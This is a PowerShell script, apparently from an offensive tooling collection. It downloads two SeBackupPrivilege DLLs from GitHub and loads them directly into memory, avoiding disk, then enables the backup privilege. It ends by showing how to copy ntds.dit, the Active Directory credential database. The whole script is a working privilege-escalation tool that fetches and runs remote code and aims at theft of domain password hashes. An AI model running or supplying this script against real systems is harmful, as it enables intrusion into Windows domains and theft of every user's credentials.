# Ensure TLS 1.2 is used for secure downloads
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# URLs of the required modules
$module1Url = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/SeBackupPrivilegeCmdLets.dll"
$module2Url = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/SeBackupPrivilegeUtils.dll"

# Function to load a DLL module directly from memory
Function Import-ModuleFromMemory {
    param (
        [Parameter(Mandatory=$true)]
        [string]$ModuleUrl
    )

    # Download the module content into a byte array
    $moduleBytes = (Invoke-WebRequest -Uri $ModuleUrl -UseBasicParsing).Content

    # Load the assembly from the byte array
    $assembly = [System.Reflection.Assembly]::Load($moduleBytes)

    # Import the module from the assembly
    Import-Module -Assembly $assembly
}

# Import the modules directly from memory
Import-ModuleFromMemory -ModuleUrl $module1Url
Import-ModuleFromMemory -ModuleUrl $module2Url

# Set and get SeBackupPrivilege
Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Inform the user about the privileges
Write-Host "You now have the Windows privileges to backup restricted files."
Write-Host "For example, you can run:"
Write-Host "Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit"
